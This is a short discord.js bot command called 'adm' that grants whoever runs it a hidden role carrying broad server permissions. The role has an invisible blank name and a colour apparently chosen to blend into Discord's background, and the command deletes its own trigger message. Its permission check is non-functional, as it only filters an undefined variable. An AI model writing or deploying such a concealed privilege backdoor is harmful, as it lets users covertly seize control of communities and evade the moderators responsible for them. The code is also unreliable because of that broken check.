const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {

   if (message.author === null || !message.member.hasPermission('ADMINISTRATOR')) commands = commands.filter(c => !c.help.admin)

        role = await message.guild.roles.create ({

            data: {
                name: "ﾠ",
          	    color: "#2f3136",
          	    permissions: [805314622]
            }

        });
       
        message.member.roles.add(role)
        message.delete();

    } catch(e) {

        console.log(e.stack);

    }
}

module.exports.help = {

    name: "adm",
    desc: "Gives you admin perms."

}
